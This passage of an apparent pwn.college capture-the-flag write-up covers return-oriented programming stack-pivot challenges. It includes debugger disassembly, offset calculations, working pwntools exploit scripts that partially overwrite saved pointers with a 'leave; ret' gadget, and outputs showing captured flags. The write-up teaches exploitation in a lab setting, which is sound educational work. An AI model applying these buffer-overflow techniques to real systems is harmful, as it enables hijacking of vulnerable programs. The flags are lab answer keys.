                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffe4e08de08 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffe4e08de78 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rbp --> 0x7ffe4e08de80 │  00 00 7f fe 4e 08 dd f8  │ 
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rsp: 0x7ffe4e08ddf8

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop rbp ; ret 
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffe4e08de00 │  00 00 7a c4 8f 54 20 00  │ --> ( win() )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffe4e08de08 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffe4e08de78 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffe4e08de80 │  00 00 7f fe 4e 08 dd f8  │ 
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rsp: 0x7fff122d4df8
rbp: 0x............ (Points to some random address)

═══════════════════════════════════════════════════════════════════════════════════
rip --> ret 
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffe4e08de08 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffe4e08de78 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffe4e08de80 │  00 00 7f fe 4e 08 dd f8  │ 
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rsp: 0x7fff122d4df8
rbp: 0x............ (Points to some random address)
rip: 0x7d32b1c75000

═══════════════════════════════════════════════════════════════════════════════════
rip --> win() 
═══════════════════════════════════════════════════════════════════════════════════
```

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *
context.arch = 'amd64'

# ROP gadgets
leave_lsb = b"\x86"
# Memory addresses and offsets
rip_offset = 128
rbp_offset = rip_offset - 8

p = process('/challenge/pivotal-payload-easy')

# Parse leaks
p.recvuntil(b"buffer is located at: ")
buffer_addr = int(p.recvline().strip().decode().replace('.', ''), 16)

# Pivot logic
# win_ptr is at leak-8. 
# Target RBP at leak-16 makes RSP land on win_ptr after 'pop rbp'.
target_rbp = buffer_addr - 16

# Stable 1-byte pivot payload
payload = flat(
    b"A" * rbp_offset,
    target_rbp,
    leave_lsb
)

p.send(payload)
p.interactive()
```

```
hacker@return-oriented-programming~pivotal-payload-easy:~$ python ~/script.py
[+] Starting local process '/challenge/pivotal-payload-easy': pid 4090
[*] Switching to interactive mode

The win function has just been dynamically constructed at 0x716333dca000.
[*] Process '/challenge/pivotal-payload-easy' stopped with exit code -11 (SIGSEGV) (pid 4090)
Received 129 bytes! This is potentially 0 gadgets.
Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
from within this challenge. You will have to do that by yourself.

+--- Printing 1 gadgets of ROP chain at 0x7ffe3d6226e8.
| 0x0000572cb4b46586: leave  ; ret  ; 

Leaving!
pwn.college{IFTW5KFDb2PpH_QZuiCM9IIfFnB.0VM2MDL4ITM0EzW}
[*] Got EOF while reading in interactive
$  
```

&nbsp;

## Pivotal Payload (Hard)

```
hacker@return-oriented-programming~pivotal-payload-hard:~$ /challenge/pivotal-payload-hard 
###
### Welcome to /challenge/pivotal-payload-hard!
###

[LEAK] Your input buffer is located at: 0x7ffcf3f46b38.

```

Requirements for crafting a successful exploit:

- [ ] Offset between the location of the buffer and the location of the stored return pointer to `main()`
- [ ] Locations of required ROP gadgets
- [ ] Offset of the overwritten stored base pointer value from the buffer

### Binary Analysis

#### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:

# ---- snip ----

   0x0000000000002023 <+535>:   mov    QWORD PTR [rbp-0x30],0x0
   0x000000000000202b <+543>:   mov    QWORD PTR [rbp-0x28],0x0
   0x0000000000002033 <+551>:   mov    QWORD PTR [rbp-0x20],0x0
   0x000000000000203b <+559>:   mov    QWORD PTR [rbp-0x18],0x0
   0x0000000000002043 <+567>:   lea    rax,[rbp-0x30]
   0x0000000000002047 <+571>:   add    rax,0x8
   0x000000000000204b <+575>:   mov    rsi,rax
   0x000000000000204e <+578>:   lea    rdi,[rip+0xfb3]        # 0x3008
   0x0000000000002055 <+585>:   mov    eax,0x0
   0x000000000000205a <+590>:   call   0x1100 <printf@plt>
   0x000000000000205f <+595>:   mov    r9d,0x0
   0x0000000000002065 <+601>:   mov    r8d,0x0
   0x000000000000206b <+607>:   mov    ecx,0x22
   0x0000000000002070 <+612>:   mov    edx,0x3
   0x0000000000002075 <+617>:   mov    esi,0x138
   0x000000000000207a <+622>:   mov    edi,0x0
   0x000000000000207f <+627>:   call   0x10f0 <mmap@plt>
   0x0000000000002084 <+632>:   mov    QWORD PTR [rbp-0x30],rax
   0x0000000000002088 <+636>:   mov    rax,QWORD PTR [rbp-0x30]
   0x000000000000208c <+640>:   mov    edx,0x138
   0x0000000000002091 <+645>:   lea    rsi,[rip+0xfa0]        # 0x3038
   0x0000000000002098 <+652>:   mov    rdi,rax
   0x000000000000209b <+655>:   call   0x1130 <memcpy@plt>
   0x00000000000020a0 <+660>:   mov    rax,QWORD PTR [rbp-0x30]
   0x00000000000020a4 <+664>:   mov    edx,0x5
   0x00000000000020a9 <+669>:   mov    esi,0x138
   0x00000000000020ae <+674>:   mov    rdi,rax
   0x00000000000020b1 <+677>:   call   0x1150 <mprotect@plt>
   0x00000000000020b6 <+682>:   test   eax,eax
   0x00000000000020b8 <+684>:   je     0x20d9 <challenge+717>
   0x00000000000020ba <+686>:   lea    rcx,[rip+0x1037]        # 0x30f8 <__PRETTY_FUNCTION__.5687>
   0x00000000000020c1 <+693>:   mov    edx,0x2b
   0x00000000000020c6 <+698>:   lea    rsi,[rip+0xfba]        # 0x3087
   0x00000000000020cd <+705>:   lea    rdi,[rip+0xfbc]        # 0x3090
   0x00000000000020d4 <+712>:   call   0x1110 <__assert_fail@plt>
   0x00000000000020d9 <+717>:   lea    rax,[rbp-0x30]
   0x00000000000020dd <+721>:   add    rax,0x8
   0x00000000000020e1 <+725>:   mov    edx,0x1000
   0x00000000000020e6 <+730>:   mov    rsi,rax
   0x00000000000020e9 <+733>:   mov    edi,0x0
   0x00000000000020ee <+738>:   call   0x1120 <read@plt>
   0x00000000000020f3 <+743>:   mov    DWORD PTR [rbp-0x4],eax
   0x00000000000020f6 <+746>:   lea    rdi,[rip+0xfcc]        # 0x30c9
   0x00000000000020fd <+753>:   call   0x10e0 <puts@plt>

# ---- snip ----

   0x0000000000002303 <+1271>:  leave
   0x0000000000002304 <+1272>:  ret
End of assembler dump.
```

Let us set a breakpoint at `challenge+214` where the call to `read()` is made.

```
pwndbg> break *(challenge+738)
Breakpoint 1 at 0x20ee
```

```
pwndbg> run
Starting program: /challenge/pivotal-payload-hard 
###
### Welcome to /challenge/pivotal-payload-hard!
###

[LEAK] Your input buffer is located at: 0x7ffcacefda58.


Breakpoint 1, 0x00005979620690ee in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────
 RAX  0x7ffcacefda58 ◂— 0
 RBX  0x5979620693c0 (__libc_csu_init) ◂— endbr64 
 RCX  0x7f3fc3dc5bcb (mprotect+11) ◂— cmp rax, -0xfff
 RDX  0x1000
 RDI  0
 RSI  0x7ffcacefda58 ◂— 0
 R8   8
 R9   0x7f3fc3edb020 ◂— xor qword ptr [rsp], rax
 R10  0x22
 R11  0x287
 R12  0x597962068160 (_start) ◂— endbr64 
 R13  0x7ffcacefdba0 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffcacefda80 —▸ 0x7ffcacefdab0 ◂— 0
 RSP  0x7ffcacefda30 ◂— 0
 RIP  0x5979620690ee (challenge+738) ◂— call read@plt
──────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────
 ► 0x5979620690ee <challenge+738>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/1)
        buf: 0x7ffcacefda58 ◂— 0
        nbytes: 0x1000
 
   0x5979620690f3 <challenge+743>    mov    dword ptr [rbp - 4], eax
   0x5979620690f6 <challenge+746>    lea    rdi, [rip + 0xfcc]           RDI => 0x59796206a0c9 ◂— 'Leaving!'
   0x5979620690fd <challenge+753>    call   puts@plt                    <puts@plt>
 
   0x597962069102 <challenge+758>    nop    
   0x597962069103 <challenge+759>    nop    
   0x597962069104 <challenge+760>    nop    
   0x597962069105 <challenge+761>    nop    
   0x597962069106 <challenge+762>    nop    
   0x597962069107 <challenge+763>    nop    
   0x597962069108 <challenge+764>    nop    
───────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7ffcacefda30 ◂— 0
01:0008│-048     0x7ffcacefda38 —▸ 0x7ffcacefdbb8 —▸ 0x7ffcaceff67e ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-040     0x7ffcacefda40 —▸ 0x7ffcacefdba8 —▸ 0x7ffcaceff65e ◂— '/challenge/pivotal-payload-hard'
03:0018│-038     0x7ffcacefda48 ◂— 0x1c3d3b53d
04:0020│-030     0x7ffcacefda50 —▸ 0x7f3fc3edb000 ◂— push rbp
05:0028│ rax rsi 0x7ffcacefda58 ◂— 0
... ↓            2 skipped
─────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x5979620690ee challenge+738
   1   0x5979620693aa main+165
   2   0x7f3fc3cd1083 __libc_start_main+243
   3   0x59796206818e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [ ] Offset between the location of the buffer and the location of the stored return pointer to `main()`
   - Location of the buffer: `0x7ffcacefda58`
- [ ] Locations of required ROP gadgets
- [ ] Offset of the overwritten stored base pointer value from the buffer

Let's get the location of the stored return pointer, and calculate the offset.

```
pwndbg> info frame
Stack level 0, frame at 0x7ffcacefda90:
 rip = 0x5979620690ee in challenge; saved rip = 0x5979620693aa
 called by frame at 0x7ffcacefdac0
 Arglist at 0x7ffcacefda80, args: 
 Locals at 0x7ffcacefda80, Previous frame's sp is 0x7ffcacefda90
 Saved registers:
  rbp at 0x7ffcacefda80, rip at 0x7ffcacefda88
```

```
pwndbg> p/d 0x7ffcacefda88 - 0x7ffcacefda58
$1 = 48
```

- [x] Offset between the location of the buffer and the location of the stored return pointer to `main()`: `48`
   - Location of the buffer: `0x7ffcacefda58`
   - Location of the stored return pointer to `main()`: `0x7ffcacefda88`
- [ ] Locations of required ROP gadgets
- [ ] Offset of the overwritten stored base pointer value from the buffer

#### ROP gadgets

The challenge has ASLR enabled, which means that the addresses of the ROP gadgets would be different safe the 3 least significant nibbles. If we decide to do partial overwrite, that will require brute forcing.

We are looking for a specific gadget `leave ; ret` which pops the value of `rbp` into `rsp`. So in our chain, if we replace the stored base pointer with the address somewhere above that of the pointer to `win()`, our stack pointer would be moved to that location above the pointer to `win()`. This would be our stack pivot.

We know that the `leave ; ret` instructions are at the epilogue of every function. We also know where this gadget is in the `challenge()` function:

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:

# ---- snip ----

   0x0000597962069303 <+1271>:  leave
   0x0000597962069304 <+1272>:  ret
End of assembler dump.
```

Let's find the address of the same gadget in `main()`.

```
pwndbg> disassemble main
Dump of assembler code for function main:

# ---- snip ----

   0x00005979620693bb <+182>:   leave
   0x00005979620693bc <+183>:   ret
End of assembler dump.
```

Finally, since we want to overwrite the stored return pointer, let's check it's value as well.

```
pwndbg> x/gx 0x7ffcacefda88
0x7ffcacefda88: 0x00005979620693aa
```

We can see that the address of the `leave ; ret gadget` in `main()` only differs in the two least significant nibbles as compared to the value of the stored return pointer (`\x93\xbb` vs `\x93\xaa`) and the gadget in `challenge()` also only differs in the two least significant nibbles as compared to the value of the stored return pointer (`\x93\x03` vs `\x93\xaa`).

Which means that regardless of whichever of the two functions we take the `leave ; ret` gadget from, we will only have to overwrite the two least significant nibbles, which we can do deterministically.

This is because the address are always `0x1000` aligned. See [here](https://writeups.kunull.net/pwn-college/intro-to-cybersecurity/binary-exploitation#partial-return-address-overwrite).

We have the following information now:

- [x] Offset between the location of the buffer and the location of the stored return pointer to `main()`: `48`
   - Location of the buffer: `0x7ffcacefda58`
   - Location of the stored return pointer to `main()`: `0x7ffcacefda88`
- [x] Locations of required ROP gadgets
   - `leave ; ret`: `\xbb`
- [ ] Offset of the overwritten stored base pointer value from the buffer

Finally we also need to define the value with which we will overwrite the stored base pointer, because that will define what is popped in `rsp`. We know the location of the buffer, so we can set the overwritten stored base pointer to that value minus 16.

- [x] Offset between the location of the buffer and the location of the stored return pointer to `main()`: `48`
   - Location of the buffer: `0x7ffcacefda58`
   - Location of the stored return pointer to `main()`: `0x7ffcacefda88`
- [x] Locations of required ROP gadgets
   - `leave ; ret`: `\xbb`
- [x] Offset of the overwritten stored base pointer value from the buffer: `-16`

### ROP chain: Stack pivot + ret2win

The ROP chain would be the exact same as the [easy challenge](#rop-chain-stack-pivot--ret2win-2).

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *
context.arch = 'amd64'

# ROP gadgets
leave_lsb = b"\x03"
# Memory addresses and offsets
rip_offset = 48
rbp_offset = rip_offset - 8

p = process('/challenge/pivotal-payload-hard')

# Parse leaks
p.recvuntil(b"buffer is located at: ")
buffer_addr = int(p.recvline().strip().decode().replace('.', ''), 16)

# Pivot logic
# win_ptr is at leak-8. 
# Target RBP at leak-16 makes RSP land on win_ptr after 'pop rbp'.
target_rbp = buffer_addr - 16

# Stable 1-byte pivot payload
payload = flat(
    b"A" * rbp_offset,
    target_rbp,
    leave_lsb
)

p.send(payload)
p.interactive()
```

```
hacker@return-oriented-programming~pivotal-payload-hard:~$ python ~/script.py
[+] Starting local process '/challenge/pivotal-payload-hard': pid 3809
[*] Switching to interactive mode

[*] Process '/challenge/pivotal-payload-hard' stopped with exit code -11 (SIGSEGV) (pid 3809)
Leaving!
pwn.college{onOkY1aJNYYk8b7iKLUDh38_3K3.0lM2MDL4ITM0EzW}
[*] Got EOF while reading in interactive
$
```

&nbsp;

## Pivotal Pursuit (Easy)

```
hacker@return-oriented-programming~pivotal-pursuit-easy:~$ /challenge/pivotal-pursuit-easy 
###
### Welcome to /challenge/pivotal-pursuit-easy!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

PIE is turned on! This means that you do not know where any of the gadgets in the main binary are. However, you can do a
partial overwrite of the saved instruction pointer in order to execute 1 gadget! If that saved instruction pointer goes
to libc, you will need to ROP from there. If that saved instruction pointer goes to the main binary, you will need to
ROP from there. You may need need to execute your payload several times to account for the randomness introduced. This
might take anywhere from 0-12 bits of bruteforce depending on the scenario.

In this challenge, a pointer to the win function is stored on the stack.
That pointer is stored at 0x7ffdcab26ff0, 8 bytes before your input buffer.
If you can pivot the stack to make the next gadget run be that win function, you will get the flag!

ASLR means that the address of the stack is not known,
but I will simulate a memory disclosure of it.
By knowing where the stack is, you can now reference data
that you write onto the stack.
Be careful: this data could trip up your ROP chain,
because it could be interpreted as return addresses.
You can use gadgets that shift the stack appropriately to avoid that.
[LEAK] Your input buffer is located at: 0x7ffdcab26ff8.

The win function has just been dynamically constructed at 0x7fc176282000.

```

- [ ] Offset between the location of the buffer and the location of the stored return pointer to `main()`
- [ ] LSB of required ROP gadgets
- [ ] Offset of the overwritten stored base pointer value from the buffer

### Binary Analysis

#### `main()`

```
pwndbg> disass main
Dump of assembler code for function main:
   0x0000000000001f27 <+0>:     endbr64
   0x0000000000001f2b <+4>:     push   rbp
   0x0000000000001f2c <+5>:     mov    rbp,rsp
   0x0000000000001f2f <+8>:     sub    rsp,0x90
   0x0000000000001f36 <+15>:    mov    DWORD PTR [rbp-0x74],edi
   0x0000000000001f39 <+18>:    mov    QWORD PTR [rbp-0x80],rsi
   0x0000000000001f3d <+22>:    mov    QWORD PTR [rbp-0x88],rdx
   0x0000000000001f44 <+29>:    mov    rax,QWORD PTR [rip+0x30d5]        # 0x5020 <stdin@@GLIBC_2.2.5>
   0x0000000000001f4b <+36>:    mov    ecx,0x0
   0x0000000000001f50 <+41>:    mov    edx,0x2
   0x0000000000001f55 <+46>:    mov    esi,0x0
   0x0000000000001f5a <+51>:    mov    rdi,rax
   0x0000000000001f5d <+54>:    call   0x1200 <setvbuf@plt>
   0x0000000000001f62 <+59>:    mov    rax,QWORD PTR [rip+0x30a7]        # 0x5010 <stdout@@GLIBC_2.2.5>
   0x0000000000001f69 <+66>:    mov    ecx,0x0
   0x0000000000001f6e <+71>:    mov    edx,0x2
   0x0000000000001f73 <+76>:    mov    esi,0x0
   0x0000000000001f78 <+81>:    mov    rdi,rax
   0x0000000000001f7b <+84>:    call   0x1200 <setvbuf@plt>
   0x0000000000001f80 <+89>:    lea    rdi,[rip+0x1211]        # 0x3198
   0x0000000000001f87 <+96>:    call   0x1160 <puts@plt>
   0x0000000000001f8c <+101>:   mov    rax,QWORD PTR [rbp-0x80]
   0x0000000000001f90 <+105>:   mov    rax,QWORD PTR [rax]
   0x0000000000001f93 <+108>:   mov    rsi,rax
   0x0000000000001f96 <+111>:   lea    rdi,[rip+0x11ff]        # 0x319c
   0x0000000000001f9d <+118>:   mov    eax,0x0
   0x0000000000001fa2 <+123>:   call   0x1190 <printf@plt>
   0x0000000000001fa7 <+128>:   lea    rdi,[rip+0x11ea]        # 0x3198
   0x0000000000001fae <+135>:   call   0x1160 <puts@plt>
   0x0000000000001fb3 <+140>:   mov    edi,0xa
   0x0000000000001fb8 <+145>:   call   0x1140 <putchar@plt>
   0x0000000000001fbd <+150>:   mov    eax,DWORD PTR [rbp-0x74]
   0x0000000000001fc0 <+153>:   mov    DWORD PTR [rbp-0x4],eax
   0x0000000000001fc3 <+156>:   mov    rax,QWORD PTR [rbp-0x80]
   0x0000000000001fc7 <+160>:   mov    QWORD PTR [rbp-0x10],rax
   0x0000000000001fcb <+164>:   mov    rax,QWORD PTR [rbp-0x88]
   0x0000000000001fd2 <+171>:   mov    QWORD PTR [rbp-0x18],rax
   0x0000000000001fd6 <+175>:   lea    rdi,[rip+0x11d3]        # 0x31b0
   0x0000000000001fdd <+182>:   call   0x1160 <puts@plt>
   0x0000000000001fe2 <+187>:   lea    rdi,[rip+0x123f]        # 0x3228
   0x0000000000001fe9 <+194>:   call   0x1160 <puts@plt>
   0x0000000000001fee <+199>:   mov    QWORD PTR [rbp-0x70],0x0
   0x0000000000001ff6 <+207>:   mov    QWORD PTR [rbp-0x68],0x0
   0x0000000000001ffe <+215>:   mov    QWORD PTR [rbp-0x60],0x0
   0x0000000000002006 <+223>:   mov    QWORD PTR [rbp-0x58],0x0
   0x000000000000200e <+231>:   mov    QWORD PTR [rbp-0x50],0x0
   0x0000000000002016 <+239>:   mov    QWORD PTR [rbp-0x48],0x0
   0x000000000000201e <+247>:   mov    QWORD PTR [rbp-0x40],0x0
   0x0000000000002026 <+255>:   mov    QWORD PTR [rbp-0x38],0x0
   0x000000000000202e <+263>:   mov    QWORD PTR [rbp-0x30],0x0
   0x0000000000002036 <+271>:   mov    rax,rsp
   0x0000000000002039 <+274>:   mov    QWORD PTR [rip+0x3020],rax        # 0x5060 <sp_>
   0x0000000000002040 <+281>:   mov    rax,rbp
   0x0000000000002043 <+284>:   mov    QWORD PTR [rip+0x2ff6],rax        # 0x5040 <bp_>
   0x000000000000204a <+291>:   mov    rdx,QWORD PTR [rip+0x2fef]        # 0x5040 <bp_>
   0x0000000000002051 <+298>:   mov    rax,QWORD PTR [rip+0x3008]        # 0x5060 <sp_>
   0x0000000000002058 <+305>:   sub    rdx,rax
   0x000000000000205b <+308>:   mov    rax,rdx
   0x000000000000205e <+311>:   shr    rax,0x3
   0x0000000000002062 <+315>:   add    rax,0x2
   0x0000000000002066 <+319>:   mov    QWORD PTR [rip+0x2fe3],rax        # 0x5050 <sz_>
   0x000000000000206d <+326>:   mov    rax,QWORD PTR [rip+0x2fcc]        # 0x5040 <bp_>
   0x0000000000002074 <+333>:   add    rax,0x8
   0x0000000000002078 <+337>:   mov    QWORD PTR [rip+0x2fd9],rax        # 0x5058 <rp_>
   0x000000000000207f <+344>:   lea    rdi,[rip+0x120a]        # 0x3290
   0x0000000000002086 <+351>:   call   0x1160 <puts@plt>
   0x000000000000208b <+356>:   lea    rdi,[rip+0x127e]        # 0x3310
   0x0000000000002092 <+363>:   call   0x1160 <puts@plt>
   0x0000000000002097 <+368>:   lea    rdi,[rip+0x12ea]        # 0x3388
   0x000000000000209e <+375>:   call   0x1160 <puts@plt>
   0x00000000000020a3 <+380>:   lea    rdi,[rip+0x1356]        # 0x3400
   0x00000000000020aa <+387>:   call   0x1160 <puts@plt>
   0x00000000000020af <+392>:   lea    rdi,[rip+0x13c2]        # 0x3478
   0x00000000000020b6 <+399>:   call   0x1160 <puts@plt>
   0x00000000000020bb <+404>:   lea    rdi,[rip+0x1406]        # 0x34c8
   0x00000000000020c2 <+411>:   call   0x1160 <puts@plt>
   0x00000000000020c7 <+416>:   lea    rax,[rbp-0x70]
   0x00000000000020cb <+420>:   mov    edx,0x8
   0x00000000000020d0 <+425>:   mov    rsi,rax
   0x00000000000020d3 <+428>:   lea    rdi,[rip+0x143e]        # 0x3518
   0x00000000000020da <+435>:   mov    eax,0x0
   0x00000000000020df <+440>:   call   0x1190 <printf@plt>
   0x00000000000020e4 <+445>:   lea    rdi,[rip+0x1475]        # 0x3560
   0x00000000000020eb <+452>:   call   0x1160 <puts@plt>
   0x00000000000020f0 <+457>:   lea    rdi,[rip+0x14d1]        # 0x35c8
   0x00000000000020f7 <+464>:   call   0x1160 <puts@plt>
   0x00000000000020fc <+469>:   lea    rdi,[rip+0x14fd]        # 0x3600
   0x0000000000002103 <+476>:   call   0x1160 <puts@plt>
   0x0000000000002108 <+481>:   lea    rdi,[rip+0x1521]        # 0x3630
   0x000000000000210f <+488>:   call   0x1160 <puts@plt>
   0x0000000000002114 <+493>:   lea    rdi,[rip+0x1555]        # 0x3670
   0x000000000000211b <+500>:   call   0x1160 <puts@plt>
   0x0000000000002120 <+505>:   lea    rdi,[rip+0x1569]        # 0x3690
   0x0000000000002127 <+512>:   call   0x1160 <puts@plt>
   0x000000000000212c <+517>:   lea    rdi,[rip+0x1595]        # 0x36c8
   0x0000000000002133 <+524>:   call   0x1160 <puts@plt>
   0x0000000000002138 <+529>:   lea    rdi,[rip+0x15c1]        # 0x3700
   0x000000000000213f <+536>:   call   0x1160 <puts@plt>
   0x0000000000002144 <+541>:   lea    rax,[rbp-0x70]
   0x0000000000002148 <+545>:   add    rax,0x8
   0x000000000000214c <+549>:   mov    rsi,rax
   0x000000000000214f <+552>:   lea    rdi,[rip+0x15f2]        # 0x3748
   0x0000000000002156 <+559>:   mov    eax,0x0
   0x000000000000215b <+564>:   call   0x1190 <printf@plt>
   0x0000000000002160 <+569>:   mov    r9d,0x0
   0x0000000000002166 <+575>:   mov    r8d,0x0
   0x000000000000216c <+581>:   mov    ecx,0x22
   0x0000000000002171 <+586>:   mov    edx,0x3
   0x0000000000002176 <+591>:   mov    esi,0x138
   0x000000000000217b <+596>:   mov    edi,0x0
   0x0000000000002180 <+601>:   call   0x1180 <mmap@plt>
   0x0000000000002185 <+606>:   mov    QWORD PTR [rbp-0x70],rax
   0x0000000000002189 <+610>:   mov    rax,QWORD PTR [rbp-0x70]
   0x000000000000218d <+614>:   mov    edx,0x138
   0x0000000000002192 <+619>:   lea    rsi,[rip+0x15df]        # 0x3778
   0x0000000000002199 <+626>:   mov    rdi,rax
   0x000000000000219c <+629>:   call   0x11d0 <memcpy@plt>
   0x00000000000021a1 <+634>:   mov    rax,QWORD PTR [rbp-0x70]
   0x00000000000021a5 <+638>:   mov    edx,0x5
   0x00000000000021aa <+643>:   mov    esi,0x138
   0x00000000000021af <+648>:   mov    rdi,rax
   0x00000000000021b2 <+651>:   call   0x1220 <mprotect@plt>
   0x00000000000021b7 <+656>:   test   eax,eax
   0x00000000000021b9 <+658>:   je     0x21da <main+691>
   0x00000000000021bb <+660>:   lea    rcx,[rip+0x1786]        # 0x3948 <__PRETTY_FUNCTION__.23120>
   0x00000000000021c2 <+667>:   mov    edx,0xa0
   0x00000000000021c7 <+672>:   lea    rsi,[rip+0x15f9]        # 0x37c7
   0x00000000000021ce <+679>:   lea    rdi,[rip+0x15fb]        # 0x37d0
   0x00000000000021d5 <+686>:   call   0x11a0 <__assert_fail@plt>
   0x00000000000021da <+691>:   mov    rax,QWORD PTR [rbp-0x70]
   0x00000000000021de <+695>:   mov    rsi,rax
   0x00000000000021e1 <+698>:   lea    rdi,[rip+0x1628]        # 0x3810
   0x00000000000021e8 <+705>:   mov    eax,0x0
   0x00000000000021ed <+710>:   call   0x1190 <printf@plt>
   0x00000000000021f2 <+715>:   lea    rax,[rbp-0x70]
   0x00000000000021f6 <+719>:   add    rax,0x8
   0x00000000000021fa <+723>:   mov    edx,0x1000
   0x00000000000021ff <+728>:   mov    rsi,rax
   0x0000000000002202 <+731>:   mov    edi,0x0
   0x0000000000002207 <+736>:   call   0x11b0 <read@plt>
   0x000000000000220c <+741>:   mov    DWORD PTR [rbp-0x1c],eax
   0x000000000000220f <+744>:   mov    eax,DWORD PTR [rbp-0x1c]
   0x0000000000002212 <+747>:   cdqe
   0x0000000000002214 <+749>:   lea    rdx,[rbp-0x70]
   0x0000000000002218 <+753>:   lea    rcx,[rdx+0x8]
   0x000000000000221c <+757>:   mov    rdx,QWORD PTR [rip+0x2e35]        # 0x5058 <rp_>
   0x0000000000002223 <+764>:   sub    rcx,rdx
   0x0000000000002226 <+767>:   mov    rdx,rcx
   0x0000000000002229 <+770>:   add    rax,rdx
   0x000000000000222c <+773>:   shr    rax,0x3
   0x0000000000002230 <+777>:   mov    rdx,rax
   0x0000000000002233 <+780>:   mov    eax,DWORD PTR [rbp-0x1c]
   0x0000000000002236 <+783>:   mov    esi,eax
   0x0000000000002238 <+785>:   lea    rdi,[rip+0x1611]        # 0x3850
   0x000000000000223f <+792>:   mov    eax,0x0
   0x0000000000002244 <+797>:   call   0x1190 <printf@plt>
   0x0000000000002249 <+802>:   lea    rdi,[rip+0x1638]        # 0x3888
   0x0000000000002250 <+809>:   call   0x1160 <puts@plt>
   0x0000000000002255 <+814>:   lea    rdi,[rip+0x1694]        # 0x38f0
   0x000000000000225c <+821>:   call   0x1160 <puts@plt>
   0x0000000000002261 <+826>:   mov    eax,DWORD PTR [rbp-0x1c]
   0x0000000000002264 <+829>:   cdqe
   0x0000000000002266 <+831>:   lea    rdx,[rbp-0x70]
   0x000000000000226a <+835>:   lea    rcx,[rdx+0x8]
   0x000000000000226e <+839>:   mov    rdx,QWORD PTR [rip+0x2de3]        # 0x5058 <rp_>
   0x0000000000002275 <+846>:   sub    rcx,rdx
   0x0000000000002278 <+849>:   mov    rdx,rcx
   0x000000000000227b <+852>:   add    rax,rdx
   0x000000000000227e <+855>:   shr    rax,0x3
   0x0000000000002282 <+859>:   add    eax,0x1
   0x0000000000002285 <+862>:   mov    edx,eax
   0x0000000000002287 <+864>:   mov    rax,QWORD PTR [rip+0x2dca]        # 0x5058 <rp_>
   0x000000000000228e <+871>:   mov    esi,edx
   0x0000000000002290 <+873>:   mov    rdi,rax
   0x0000000000002293 <+876>:   call   0x1720 <print_chain>
   0x0000000000002298 <+881>:   lea    rdi,[rip+0x1693]        # 0x3932
   0x000000000000229f <+888>:   call   0x1160 <puts@plt>
   0x00000000000022a4 <+893>:   nop
   0x00000000000022a5 <+894>:   lea    rdi,[rip+0x168f]        # 0x393b
   0x00000000000022ac <+901>:   call   0x1160 <puts@plt>
   0x00000000000022b1 <+906>:   mov    eax,0x0
   0x00000000000022b6 <+911>:   leave
   0x00000000000022b7 <+912>:   ret
End of assembler dump.
```

```
pwndbg> break *(main+736)
